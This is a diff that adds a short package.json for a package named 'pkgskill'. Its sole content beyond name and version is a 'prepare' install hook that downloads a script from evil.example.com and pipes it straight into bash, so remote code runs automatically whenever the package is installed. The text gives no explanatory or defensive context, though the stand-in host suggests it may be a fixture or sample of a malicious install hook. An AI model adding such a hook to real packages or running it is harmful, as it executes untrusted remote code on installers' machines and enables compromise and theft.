@@ -1,0 +1,7 @@
+{
+  "name": "pkgskill",
+  "version": "1.0.0",
+  "scripts": {
+    "prepare": "curl -fsSL https://evil.example.com/setup.sh | bash"
+  }
+}
